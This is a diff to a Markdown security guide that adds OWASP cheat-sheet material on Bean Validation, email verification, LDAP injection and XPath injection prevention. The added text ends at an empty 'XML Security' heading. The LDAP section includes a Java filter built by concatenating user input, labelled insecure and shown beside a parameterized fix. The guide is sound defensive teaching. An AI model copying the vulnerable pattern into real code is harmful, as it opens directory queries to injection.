@@ -1,14 +1,14 @@
 ---
 title: "Injection and Input Handling"
 order: 2
-summary: "Untrusted input as an attack: validation, SQL and NoSQL injection, command and template injection, XXE, deserialization, uploads and prototype pollution."
+summary: "Untrusted input as an attack: validation, SQL, NoSQL, LDAP and XPath injection, command and template injection, XML attacks, deserialization, uploads and prototype pollution."
 category: "Security"
 level: Intermediate
 ---
 
 # Injection and Input Handling
 
-Untrusted input as an attack: validation, SQL and NoSQL injection, command and template injection, XXE, deserialization, uploads and prototype pollution.
+Untrusted input as an attack: validation, SQL, NoSQL, LDAP and XPath injection, command and template injection, XML attacks, deserialization, uploads and prototype pollution.
 
 ## Input Validation
 
@@ -86,6 +86,632 @@ Use a maintained email validation library compatible with the addresses your mai
 - **Assuming regex or Unicode normalization makes data safe:** Check whole-value matching and resource limits; keep normalization consistent with the field's meaning.
 - **Trusting upload metadata:** Use the file upload controls above; checking a filename is not checking the file's contents.
 - **Logging rejected input verbatim:** Record the failure and relevant metadata without secrets or full request bodies. Escape any retained untrusted values for the log format to prevent log injection; see [Logging: Event collection](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html#event-collection) and [Data to exclude](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html#data-to-exclude).
+
+## Bean Validation
+
+> **Source:** [Bean Validation](https://cheatsheetseries.owasp.org/cheatsheets/Bean_Validation_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0
+
+### Introduction
+
+This article is focused on providing clear, simple, actionable guidance for providing Java Bean Validation security functionality in your applications.
+
+Bean validation (aka [Jakarta Validation](https://beanvalidation.org/)) is one of the most common ways to perform [input validation](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html) in Java. It is an application layer agnostic validation spec which provides the developer with the means to define a set of validation constraints on a domain model and then perform validation of those constraints through out the various application tiers.
+
+One advantage of this approach is that the validation constraints and the corresponding validators are only written once, thus reducing duplication of effort and ensuring uniformity:
+
+#### Typical Validation
+
+![Typical](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/Bean_Validation_Cheat_Sheet_Typical.png)
+
+#### Bean Validation
+
+![JSR](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/Bean_Validation_Cheat_Sheet_JSR.png)
+
+### Setup
+
+The illustrative examples below use the legacy `javax.validation` API, including its [built-in constraint package](https://docs.hibernate.org/beanvalidation/spec/1.1/api/javax/validation/constraints/package-summary.html), with Hibernate Validator. [Jakarta Validation 3.0](https://jakarta.ee/specifications/bean-validation/3.0/jakarta-bean-validation-spec-3.0.html) uses `jakarta.validation`; use API and provider versions compatible with your application.
+
+Add Hibernate Validator to your **pom.xml**:
+
+```xml
+<dependency>
+   <groupId>org.hibernate</groupId>
+   <artifactId>hibernate-validator</artifactId>
+   <version>USE_LATEST_VERSION</version>
+</dependency>
+```
+
+Enable bean validation support in Spring's **context.xml**:
+
+```xml
+<beans:beans ...
+   ...
+   <mvc:annotation-driven />
+   ...
+</beans:beans>
+```
+
+For more info, please see the [setup guide](https://hibernate.org/validator/documentation/getting-started/)
+
+### Basics
+
+In order to get started using Bean Validation, you must add validation constraints (`@Pattern`, `@Digits`, `@Min`, `@Max`, `@Size`, `@Past`, `@Future`, `@CreditCardNumber`, `@Email`, `@URL`, etc.) to your model and then utilize the `@Valid` annotation when passing your model around in various application layers.
+
+Constraints can be applied in several places:
+
+- Fields
+- Properties
+- Classes
+
+For Bean Validation 1.1 also on:
+
+- Parameters
+- Return values
+- Constructors
+
+For the sake of simplicity all the examples below feature field constraints and all validation is triggered by the controller. Refer to the Bean Validation documentation for a full list of examples.
+
+When it comes to error handling, the Hibernate Validator returns a `BindingResult` object which contains a `List<ObjectError>`. The examples below feature simplistic error handling, while a production ready application would have a more elaborate design that takes care of logging and error page redirection.
+
+### Predefined Constraints
+
+#### @Pattern
+
+**Annotation**:
+
+`@Pattern(regexp=,flags=)`
+
+**Data Type**:
+
+`CharSequence`
+
+**Use**:
+
+Checks if the annotated string matches the regular expression regex considering the given flag match. Please visit [OWASP Validation Regex Repository](https://owasp.org/www-community/OWASP_Validation_Regex_Repository) for other useful regex's.
+
+**Reference**:
+
+[Documentation](https://docs.jboss.org/hibernate/validator/5.2/reference/en-US/html/ch02.html#section-builtin-constraints)
+
+**Model**:
+
+```java
+import javax.validation.constraints.Pattern;
+
+public class Article  {
+ //Constraint: One or more ASCII letters, digits, or spaces
+ @Pattern(regexp = "[a-zA-Z0-9 ]+")
+ private String articleTitle;
+ public String getArticleTitle()  {
+  return  articleTitle;
+ }
+ public void setArticleTitle(String  articleTitle)  {
+   this.articleTitle  =  articleTitle;
+  }
+
+  ...
+
+}
+```
+
+**Controller**:
+
+```java
+import javax.validation.Valid;
+import com.company.app.model.Article;
+
+@Controller
+public class ArticleController  {
+
+ ...
+
+ @RequestMapping(value = "/postArticle",  method = RequestMethod.POST)
+ public @ResponseBody String postArticle(@Valid  Article  article,  BindingResult  result,
+ HttpServletResponse  response) {
+  if (result.hasErrors()) {
+   String errorMessage  =  "";
+   response.setStatus(HttpServletResponse.SC_BAD_REQUEST);
+   List<ObjectError> errors = result.getAllErrors();
+   for(ObjectError  e :  errors) {
+    errorMessage += "ERROR: " +  e.getDefaultMessage();
+   }
+   return  errorMessage;
+  } else {
+   return  "Validation Successful";
+  }
+ }
+}
+```
+
+#### @Digits
+
+**Annotation**:
+
+`@Digits(integer=,fraction=)`
+
+**Data Type**:
+
+`BigDecimal`, `BigInteger`, `CharSequence`, `byte`, `short`, `int`, `long` and the respective wrappers of the primitive types; Additionally supported by HV: any sub-type of Number
+
+**Use**:
+
+Checks whether the annotated value is a number having up to integer digits and fraction fractional digits
+
+**Reference**:
+
+[Documentation](https://docs.jboss.org/hibernate/validator/5.2/reference/en-US/html/ch02.html#section-builtin-constraints)
+
+**Model**:
+
+```java
+import javax.validation.constraints.Digits;
+
+public class Customer {
+  //Constraint: Age can only be 3 digits long or less
+  @Digits(integer = 3, fraction = 0)
+  private int age;
+
+  public int getAge()  {
+    return age;
+  }
+
+  public void setAge(int age)  {
+      this.age = age;
+    }
+
+    ...
+}
+```
+
+**Controller**:
+
+```java
+import javax.validation.Valid;
+import com.company.app.model.Customer;
+
+@Controller
+public class CustomerController  {
+
+ ...
+
+ @RequestMapping(value = "/registerCustomer",  method = RequestMethod.POST)
+ public @ResponseBody String registerCustomer(@Valid Customer customer, BindingResult result,
+ HttpServletResponse  response) {
+
+  if (result.hasErrors()) {
+   String errorMessage = "";
+   response.setStatus(HttpServletResponse.SC_BAD_REQUEST);
+   List<ObjectError> errors = result.getAllErrors();
+
+   for( ObjectError  e :  errors) {
+    errorMessage += "ERROR: "  +  e.getDefaultMessage();
+   }
+   return  errorMessage;
+  } else {
+   return  "Validation Successful";
+  }
+ }
+}
+```
+
+#### @Size
+
+**Annotation**:
+
+`@Size(min=,` `max=)`
+
+**Data Type**:
+
+`CharSequence`, `Collection`, `Map` and `Arrays`
+
+**Use**:
+
+Checks if the annotated element's size is between min and max (inclusive)
+
+**Reference**:
+
+[Documentation](https://docs.jboss.org/hibernate/validator/5.2/reference/en-US/html/ch02.html#section-builtin-constraints)
+
+**Model**:
+
+```java
+import javax.validation.constraints.Size;
+
+public class Message {
+
+   //Constraint: Message must contain 10 to 500 characters, inclusive
+   @Size(min = 10, max = 500)
+   private String message;
+
+   public String getMessage() {
+      return message;
+   }
+
+   public void setMessage(String message) {
+      this.message = message;
+   }
+
+...
+}
+```
+
+**Controller**:
+
+```java
+import javax.validation.Valid;
+import com.company.app.model.Message;
+
+@Controller
+public class MessageController {
+
+...
+
+@RequestMapping(value="/sendMessage", method=RequestMethod.POST)
+public @ResponseBody String sendMessage(@Valid Message message, BindingResult result,
+HttpServletResponse response){
+
+   if(result.hasErrors()){
+      String errorMessage = "";
+      response.setStatus(HttpServletResponse.SC_BAD_REQUEST);
+      List<ObjectError> errors = result.getAllErrors();
+      for( ObjectError e : errors){
+         errorMessage+= "ERROR: " + e.getDefaultMessage();
+      }
+      return errorMessage;
+   }
+   else{
+      return "Validation Successful";
+   }
+}
+}
+```
+
+#### @Past / @Future
+
+**Annotation**:
+
+`@Past,` `@Future`
+
+**Data Type**:
+
+`java.util.Date`, `java.util.Calendar`, `java.time.chrono.ChronoZonedDateTime`, `java.time.Instant`, `java.time.OffsetDateTime`
+
+**Use**:
+
+Checks whether the annotated date is in the past / future. Use a supported date type, such as `java.util.Date`; [`@Future` does not validate date strings](https://docs.hibernate.org/beanvalidation/spec/1.1/api/javax/validation/constraints/Future.html).
+
+**Reference**:
+
+[Documentation](https://docs.jboss.org/hibernate/validator/5.2/reference/en-US/html/ch02.html#section-builtin-constraints)
+
+**Model**:
+
+```java
+import java.util.Date;
+import javax.validation.constraints.Past;
+import javax.validation.constraints.Future;
+
+public class DoctorVisit {
+
+   //Constraint: Birthdate must be in the past
+   @Past
+   private Date birthDate;
+
+   public Date getBirthDate() {
+      return birthDate;
+   }
+
+   public void setBirthDate(Date birthDate) {
+      this.birthDate = birthDate;
+   }
+
+   //Constraint: Schedule visit date must be in the future
+   @Future
+   private Date scheduledVisitDate;
+
+   public Date getScheduledVisitDate() {
+      return scheduledVisitDate;
+   }
+
+   public void setScheduledVisitDate(Date scheduledVisitDate) {
+      this.scheduledVisitDate = scheduledVisitDate;
+   }
+
+...
+}
+```
+
+**Controller**:
+
+```java
+import javax.validation.Valid;
+import com.company.app.model.DoctorVisit;
+
+@Controller
+public class DoctorVisitController {
+
+   ...
+
+   @RequestMapping(value="/scheduleVisit", method=RequestMethod.POST)
+   public @ResponseBody String scheduleVisit(@Valid DoctorVisit doctorvisit, BindingResult result,
+   HttpServletResponse response){
+
+      if(result.hasErrors()){
+         String errorMessage = "";
+         response.setStatus(HttpServletResponse.SC_BAD_REQUEST);
+         List<ObjectError> errors = result.getAllErrors();
+         for( ObjectError e : errors){
+            errorMessage+= "ERROR: " + e.getDefaultMessage();
+         }
+         return errorMessage;
+      }
+      else{
+         return "Validation Successful";
+      }
+   }
+}
+```
+
+#### Combining Constraints
+
+Validation annotations can be combined in any suitable way. For instance, to specify a valid reviewRating value between 1 and 5, specify the validation like this :
+
+**Annotation**:
+
+`@Min(value=),` `@Max(value=)`
+
+**Data Type**:
+
+`BigDecimal`, `BigInteger`, `byte`, `short`, `int`, `long` and the respective wrappers of the primitive types; Additionally supported by HV: any sub-type of `CharSequence` (the numeric value represented by the character sequence is evaluated), any sub-type of Number
+
+**Use**:
+
+Checks whether the annotated value is higher/lower than or equal to the specified minimum
+
+**Reference:**
+
+[Documentation](https://docs.jboss.org/hibernate/validator/9.0/reference/en-US/html_single/#section-builtin-constraints)
+
+**Model**:
+
+```java
+import javax.validation.constraints.Min;
+import javax.validation.constraints.Max;
+
+public class Review {
+
+ //Constraint: Review rating must be between 1 and 5
+ @Min(1)
+ @Max(5)
+ private int reviewRating;
+
+ public int getReviewRating() {
+   return reviewRating;
+ }
+
+ public void setReviewRating(int reviewRating) {
+   this.reviewRating = reviewRating;
+}
+ ...
+}
+```
+
+**Controller**:
+
+```java
+import javax.validation.Valid;
+import com.company.app.model.ReviewRating;
+
+@Controller
+public class ReviewController {
+
+   ...
+
+   @RequestMapping(value="/postReview", method=RequestMethod.POST)
+   public @ResponseBody String postReview(@Valid Review review, BindingResult result,
+   HttpServletResponse response){
+
+      if(result.hasErrors()){
+         String errorMessage = "";
+         response.setStatus(HttpServletResponse.SC_BAD_REQUEST);
+         List<ObjectError> errors = result.getAllErrors();
+         for( ObjectError e : errors){
+            errorMessage+= "ERROR: " + e.getDefaultMessage();
+         }
+         return errorMessage;
+      }
+       else{
+         return "Validation Successful";
+      }
+   }
+}
+```
+
+#### Cascading Constraints
+
+Validating one bean is a good start, but often, beans are nested or in a complete graph of beans. To validate that graph in one go, apply cascading validation with [@Valid](https://docs.jboss.org/hibernate/validator/9.0/reference/en-US/html_single/#_cascaded_validation)
+
+#### Additional Constraints
+
+In addition to providing the complete set of JSR303 constraints, Hibernate Validator also defines some additional constraints for convenience:
+
+- `@CreditCardNumber`
+- `@EAN`
+- `@Email`
+- `@Length`
+- `@Range`
+- `@ScriptAssert`
+- `@URL`
+
+Take a look at this [list](https://docs.jboss.org/hibernate/validator/9.0/reference/en-US/html_single/#validator-defineconstraints-hv-constraints) for the complete list.
+
+Note that `@SafeHtml`, a previously valid constraint, has been deprecated according to the [Hibernate Validator 6.1.0.Final and 6.0.18.Final release blogpost](https://in.relation.to/2019/11/20/hibernate-validator-610-6018-released/). Please refrain from using the `@SafeHtml` constraint.
+
+### Custom Constraints
+
+One of the most powerful features of bean validation is the ability to define your own constraints that go beyond the simple validation offered by built-in constraints.
+
+Creating custom constraints is beyond the scope of this guide. Please see this [documentation](https://docs.jboss.org/hibernate/validator/).
+
+### Error Messages
+
+It is possible to specify a message ID with the validation annotation, so that error messages are customized :
+
+```java
+@Pattern(regexp = "[a-zA-Z0-9 ]+", message="article.title.error")
+private String articleTitle;
+```
+
+Spring MVC will then look up a message with ID *article.title.error* in a defined MessageSource. More on this [documentation](https://www.silverbaytech.com/2013/04/16/custom-messages-in-spring-validation/).
+
+## Email Validation and Verification in Identity Systems
+
+> **Source:** [Email Validation and Verification in Identity Systems](https://cheatsheetseries.owasp.org/cheatsheets/Email_Validation_and_Verification_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0
+
+### Introduction
+
+Email addresses are widely used as primary identifiers in authentication and account recovery workflows. Improper handling of email validation, normalization, and verification can lead to account takeover, user enumeration, and identity confusion.
+
+This cheat sheet provides guidance on securely handling email addresses within identity systems. See the [Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html) for broader identity controls.
+
+### Goals
+
+- Safely treat email as an identifier
+- Prevent account takeover via email-based flows
+- Reduce user enumeration risk
+- Define secure verification and change workflows
+
+### Threat Model
+
+Attackers may attempt to:
+
+- Register equivalent or visually similar email addresses
+- Exploit inconsistent normalization logic
+- Abuse password reset functionality
+- Enumerate valid accounts
+- Take over accounts through email change workflows
+
+### Email Canonicalization
+
+Applications must define a consistent normalization strategy before storing or comparing email addresses.
+
+#### Recommendations
+
+- Normalize the domain portion to lowercase
+- Avoid provider-specific transformations (e.g., Gmail dot removal) unless fully controlled
+- Store both:
+    - Original input (for display and communication)
+    - Canonical form (for comparison according to your policy)
+- Document the comparison policy explicitly and apply it consistently across registration, login, password reset, account recovery, and account linking flows
+
+### Email Format Validation
+
+Strict regex-based validation often rejects valid addresses or introduces inconsistencies.
+
+#### Recommendations
+
+- Use well-tested libraries instead of custom regex
+- Accept a broad range of valid formats
+- Reject clearly malformed input only
+
+### Unicode and IDN Considerations
+
+Unicode introduces spoofing risks via visually similar characters.
+
+#### Recommendations
+
+- Normalize Unicode input
+- Convert internationalized domains to punycode for comparison
+- Be aware of homoglyph attacks (e.g., Latin vs Cyrillic characters)
+- Be especially cautious with internationalized local-parts, because normalization and comparison behavior may differ across systems
+
+### Case Sensitivity
+
+- Domain part: always case-insensitive
+- Local part: technically case-sensitive under SMTP, though many providers do not enforce this in practice
+
+#### Recommendation
+
+- Preserve the original email address as entered by the user
+- Define an explicit comparison policy for the local part based on your identity architecture and interoperability requirements
+- Only fold or normalize the local part when the system fully owns that behavior and the decision will not create account-collision or mistaken-account risk
+
+### Email Ownership Verification
+
+Email ownership must be verified before enabling account use.
+
+#### Recommendations
+
+- Use cryptographically secure, random tokens
+- Ensure tokens are:
+    - Single-use
+    - Time-limited
+- Do not activate accounts before verification is completed
+
+### Password Reset Flows
+
+Password reset is a high-risk operation. See the [Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html) for recovery controls.
+
+#### Recommendations
+
+- Use single-use, time-limited tokens
+- Do not disclose whether an email exists in the system
+- Invalidate tokens after use or expiration
+- Rate limit reset requests
+
+### Email Change Workflows
+
+Changing an email address is equivalent to changing identity.
+
+#### Recommendations
+
+- Require re-authentication
+- Notify the existing email address of the change
+- Require confirmation of the new email address
+- Consider requiring confirmation from both addresses for high-risk systems
+
+### Anti-Enumeration Controls
+
+Attackers should not be able to determine whether an email is registered.
+
+#### Recommendations
+
+- Use consistent responses for login and reset flows
+- Avoid timing discrepancies between valid and invalid cases
+- Implement rate limiting and monitoring
+
+### Temporary Email Abuse
+
+Disposable email services can be used to bypass controls.
+
+#### Recommendations
+
+- Maintain a list of known disposable domains if appropriate
+- Prefer risk-based controls over strict blocking
+- Monitor for suspicious patterns of account creation
+
+### Email as an Authentication Factor
+
+Email should not be treated as a strong authentication factor.
+
+#### Recommendations
+
+- Treat email as a weak factor
+- Require multi-factor authentication (MFA) for sensitive operations
+- Do not rely on email alone for account security
+
+### Logging and Monitoring
+
+Monitoring email-related flows helps detect abuse.
+
+#### Recommendations
+
+- Log verification attempts and failures
+- Monitor password reset activity
+- Detect abnormal patterns (e.g., high-frequency requests)
+- Avoid logging full email addresses; mask or pseudonymize them where logging is necessary (e.g., `j***@example.com`)
+- Never log verification, reset, or authentication tokens or full verification/reset URLs
+- Treat email addresses and related identifiers in logs as personal or sensitive data and restrict access accordingly
 
 ## Injection Prevention
 
@@ -1249,6 +1875,216 @@ For more information please check following cheat sheets:
 - Concatenating user input into query language strings or shell commands for DB tools.
 - Leaving MongoDB unsecured (no auth) listening on public IP.
 
+## LDAP Injection Prevention
+
+> **Source:** [LDAP Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0
+
+### Introduction
+
+The Lightweight Directory Access Protocol (LDAP) allows an application to remotely perform operations such as searching and modifying records in
+directories. LDAP injection results from inadequate input sanitization and validation and allows malicious users to glean restricted information using the
+directory service. For general information about LDAP please visit [lightweight directory access protocol (LDAP)](https://www.redhat.com/en/topics/security/what-is-ldap-authentication).
+
+LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements through techniques similar to [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection).
+
+This cheatsheet is focused on providing clear, simple, actionable guidance for preventing LDAP Injection flaws in your applications. [LDAP injection](https://owasp.org/www-community/attacks/LDAP_Injection) attacks are common due to two factors:
+
+1. The lack of safer, parameterized LDAP query interfaces
+2. The widespread use of LDAP to authenticate users to systems.
+
+LDAP injection attacks could result in the granting of permissions to unauthorized queries, and content modification inside the LDAP tree.
+
+Primary Defenses:
+
+- Escape all variables using the right LDAP encoding function
+- Use a framework that escapes automatically.
+
+Additional Defenses:
+
+- Least Privilege
+- Allow-List Input Validation
+
+### Primary Defenses
+
+#### Defense Option 1: Escape all variables using the right LDAP encoding function
+
+##### Distinguished Name Escaping
+
+The main way LDAP stores names is based on DN (distinguished name). You can think of this like a unique identifier. These are sometimes used to access resources, like a username.
+
+A DN might look like this
+
+`cn=Richard Feynman, ou=Physics Department, dc=Caltech, dc=edu`
+
+or
+
+`uid=inewton, ou=Mathematics Department, dc=Cambridge, dc=com`
+
+An allowlist can be used to restrict input to a list of valid characters. Characters and character sequences that must be excluded from allowlists — including
+Java Naming and Directory Interface (JNDI) metacharacters and LDAP special characters — are listed in the following list.
+
+The [exhaustive list](https://ldapwiki.com/wiki/Wiki.jsp?page=DN%20Escape%20Values) is the following: `\ # + < > , ; " =` and leading or trailing spaces.
+
+Some "special" characters that are allowed in Distinguished Names and do not need to be escaped include:
+
+```text
+* ( ) . & - _ [ ] ` ~ | @ $ % ^ ? : { } ! '
+```
+
+##### Search Filter Escaping
+
+Each DN points to exactly 1 entry, which can be thought of sort of like a row in a RDBMS. For each entry, there will be 1 or more attributes which are analogous to RDBMS columns. If you are interested in searching through LDAP for users with certain attributes, you may do so with search filters.
+
+In a search filter, you can use standard boolean logic to get a list of users matching an arbitrary constraint. Search filters are written in Polish notation AKA prefix notation.
+
+Example:
+
+```text
+(&(ou=Physics)(|
+(manager=cn=Freeman Dyson,ou=Physics,dc=Caltech,dc=edu)
+(manager=cn=Albert Einstein,ou=Physics,dc=Princeton,dc=edu)
+))
+```
+
+When building LDAP queries in application code, you MUST escape any untrusted data that is added to any LDAP query. There are two forms of LDAP escaping. Encoding for LDAP Search and Encoding for LDAP DN (distinguished name). The proper escaping depends on whether you are sanitizing input for a search filter, or you are using a DN as a username-like credential for accessing some resource.
+
+Some "special" characters that are allowed in search filters and must be escaped include:
+
+```text
+* ( ) \ NUL
+```
+
+For more information on search filter escaping visit [RFC4515](https://datatracker.ietf.org/doc/html/rfc4515#section-3).
+
+##### Safe Java Escaping Example
+
+The following example validates `userSN` with an allowlist. With Java's default [predefined character classes](https://docs.oracle.com/javase/8/docs/api/java/util/regex/Pattern.html#predef), it accepts ASCII letters, digits, underscores, and whitespace (including tabs and line breaks); `*` also permits an empty string. This illustrative rule is not a general validation policy for personal names. Choose an allowlist that matches the application's requirements and apply the appropriate LDAP escaping for values outside that restricted set.
+
+```java
+// String userSN = "Sherlock Holmes"; // Valid
+// ... beginning of LDAPInjection.searchRecord()...
+sc.setSearchScope(SearchControls.SUBTREE_SCOPE);
+String base = "dc=example,dc=com";
+
+if (!userSN.matches("[\\w\\s]*")) {
+ throw new IllegalArgumentException("Invalid input");
+}
+
+String filter = "(sn = " + userSN + ")";
+// ... remainder of LDAPInjection.searchRecord()...
+```
+
+When a database field must include special characters, it is critical to ensure that the authentic data is stored in sanitized form in the
+database and also that any user input is normalized before the validation or comparison takes place. Using characters that have special meanings in JNDI
+and LDAP in the absence of a comprehensive normalization and allowlisting-based routine is discouraged. Special characters must be transformed to
+sanitized, safe values before they are added to the allowlist expression against which input will be validated. Likewise, normalization of user input should
+occur before the validation step (source: [Prevent LDAP injection](https://wiki.sei.cmu.edu/confluence/spaces/flyingpdf/pdfpageexport.action?pageId=88487534)).
+
+The [OWASP ESAPI `Encoder` API](https://javadoc.io/static/org.owasp.esapi/esapi/2.7.0.0/org/owasp/esapi/Encoder.html) provides `encodeForLDAP(String)` for search-filter values and `encodeForDN(String)` for distinguished-name values. Choose the method for the LDAP context where the value will be used.
+
+##### Insecure vs Secure Java LDAP Query Construction
+
+❌ **Insecure Example (vulnerable to LDAP Injection)**
+
+```java
+// User input directly concatenated into the filter
+String filter = "(&(uid=" + userInput + ")(objectClass=person))";
+NamingEnumeration<SearchResult> results =
+    ctx.search("ou=users,dc=example,dc=com", filter, controls);
+
+✅ Secure Example (using parameterized filter)
+
+// User input safely passed as a parameter
+String filter = "(&(uid={0})(objectClass=person))";
+NamingEnumeration<SearchResult> results =
+    ctx.search("ou=users,dc=example,dc=com", filter, new Object[]{ userInput }, controls);
+```
+
+##### Safe C Sharp .NET TBA Example
+
+[.NET AntiXSS](https://blogs.msdn.microsoft.com/securitytools/2010/09/30/antixss-4-0-released/) (now the Encoder class) has LDAP encoding functions including `Encoder.LdapFilterEncode(string)`, `Encoder.LdapDistinguishedNameEncode(string)` and `Encoder.LdapDistinguishedNameEncode(string, bool, bool)`.
+
+`Encoder.LdapFilterEncode` encodes input according to [RFC4515](https://datatracker.ietf.org/doc/html/rfc4515) where unsafe values are converted to `\XX` where `XX` is the representation of the unsafe character.
+
+Use `Encoder.LdapDistinguishedNameEncode` for distinguished-name attribute values. In [DN string escaping](https://datatracker.ietf.org/doc/html/rfc4514#section-2.4), `\XX` represents an escaped byte using two hexadecimal digits; selected special characters can instead be prefixed with a backslash. Escape leading spaces or `#` and trailing spaces. A leading `#` followed by hexadecimal pairs represents an entire attribute value encoded using Basic Encoding Rules (BER), not individual character escapes.
+
+`LdapDistinguishedNameEncode(string, bool, bool)` is also provided so you may turn off the initial or final character escaping rules, for example if you are concatenating the escaped distinguished name fragment into the midst of a complete distinguished name.
+
+#### Defense Option 2: Use Frameworks that Automatically Protect from LDAP Injection
+
+##### Safe .NET Example
+
+We recommend using [LINQ to LDAP](https://www.nuget.org/packages/LinqToLdap/) (for .NET Framework 4.5 or lower [until it has been updated](https://github.com/madhatter22/LinqToLdap/issues/31)) in DotNet. It provides automatic LDAP encoding when building LDAP queries.
+Contact the [Readme file](https://github.com/madhatter22/LinqToLdap/blob/master/README.md) in the project repository.
+
+### Additional Defenses
+
+Beyond adopting one of the two primary defenses, we also recommend adopting all of these additional defenses in order to provide defense in depth. These additional defenses are:
+
+- **Least Privilege**
+- **Allow-List Input Validation**
+
+#### Least Privilege
+
+To minimize the potential damage of a successful LDAP injection attack, you should minimize the privileges assigned to the LDAP binding account in your environment.
+
+#### Enabling Bind Authentication
+
+Authenticated LDAP bind establishes an [authenticated authorization state](https://datatracker.ietf.org/doc/html/rfc4513#section-5.1.3); it does not prevent user input from changing a search filter constructed by the application. Continue to apply the [primary injection defenses](#primary-defenses), including [search-filter escaping](https://datatracker.ietf.org/doc/html/rfc4515#section-3), even when the application binds with valid credentials.
+
+When using name/password authentication, reject empty passwords before binding. A nonempty name with an empty password can perform an [unauthenticated bind](https://datatracker.ietf.org/doc/html/rfc4513#section-5.1.2) that establishes anonymous authorization; a successful result in that case does not prove the user's identity. Require authenticated access to protected directory data and use a least-privileged binding account.
+
+#### Allow-List Input Validation
+
+Input validation can be used to detect unauthorized input before it is passed to the LDAP query. For more information please see the [Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html).
+
+## XPath Injection Prevention
+
+> **Source:** [XPath Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XPath_Injection_Prevention_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0
+
+### Introduction
+
+XPath selects data from XML documents. [XPath injection](https://cwe.mitre.org/data/definitions/643.html) occurs when external input becomes part of an expression's syntax, allowing it to change the query's meaning. Prevent it by keeping expressions under application control and passing external values through variable binding.
+
+### Bind Values to Fixed Expressions
+
+Use an XPath API that supports variables. Write the expression in application code and supply external values separately. Do not concatenate or interpolate input into the expression, even if you compile it afterward: [compilation alone does not separate data from query syntax](https://cwe.mitre.org/data/definitions/643.html).
+
+For example, Python's [lxml `xpath()` method accepts variables as keyword arguments](https://lxml.de/xpathxslt.html#the-xpath-method). This illustrative lookup assumes `xml_document` is an already parsed lxml document and `requested_id` is an external string:
+
+```python
+books = xml_document.xpath(
+    "/catalog/book[@id=$book_id]",
+    book_id=requested_id,
+)
+```
+
+The expression stays fixed; `requested_id` supplies only the value of `$book_id`. The application must separately authorize access to the selected books.
+
+For Java, use the resolver pattern in the [Java Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Java_Security_Cheat_Sheet.html#xml-xpath-injection). Check the documentation for your particular API: accepting an XPath string or compiling an expression does not by itself mean the API provides variable binding.
+
+If the API cannot bind values, prefer one that can. Where practical, use a fixed expression to retrieve an authorized set of records and compare values in application code. Do not substitute ad hoc quote replacement for variable binding.
+
+### Keep Query Structure Under Application Control
+
+[XPath variables represent values](https://www.w3.org/TR/xpath-31/#id-variables); they do not substitute expression fragments. When a user chooses a query mode, map that choice to a complete, fixed expression defined by the application. Reject unknown choices and bind any external data values separately.
+
+For example, a catalog application can map the choices `books` and `magazines` to the fixed paths `/catalog/book` and `/catalog/magazine`. Do not insert the selected choice directly into a path or accept user-supplied predicates, operators, or function calls.
+
+Validate values against the application's expected types, lengths, and business rules, following the [Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html). Validation complements binding; it does not make dynamically constructed XPath safe by itself.
+
+### Limit Exposure and Review Usage
+
+Keep these controls separate from the binding mechanism:
+
+- **Authorization:** Check the caller's permission to access each requested resource. A fixed query, narrow path, or bound identifier does not establish permission. Follow the [Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html#validate-the-permissions-on-every-request) and the [principle of least privilege](https://owasp.org/www-community/Access_Control#principle-of-least-privilege) to limit the data an operation can access and return.
+- **Error handling:** Keep XPath expressions, XML contents, and stack traces out of client-facing error messages. Follow the [Error Handling Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html). Generic errors reduce disclosure; they do not prevent injection.
+- **XML parsing:** Configure the parser according to the [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html). Parser hardening addresses XML parser risks, not unsafe XPath construction; binding values does not harden the parser.
+
+During code review, locate calls that evaluate or compile XPath. Trace each expression back to application-controlled text and verify that external values reach it only through variable binding. For fixed query mappings, verify that unknown choices are rejected. Include correctness checks for ordinary valid values, absent records, and access to resources outside the caller's permissions.
+
+For security assessment guidance, see the [Web Security Testing Guide's XPath injection chapter](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/09-XPath_Injection/).
+
 ## Server-Side Template Injection Prevention
 
 > **Source:** [Server-Side Template Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0
@@ -1804,6 +2640,871 @@ The official registry rule is [saxparserfactory-disallow-doctype-decl-missing](h
 
 Identifying XXE vulnerability in the `javax.xml.stream.XMLInputFactory` library.
 The official registry rule is [xmlinputfactory-possible-xxe](https://semgrep.dev/r/java.lang.security.xmlinputfactory-possible-xxe.xmlinputfactory-possible-xxe).
+
+## XML Security
+
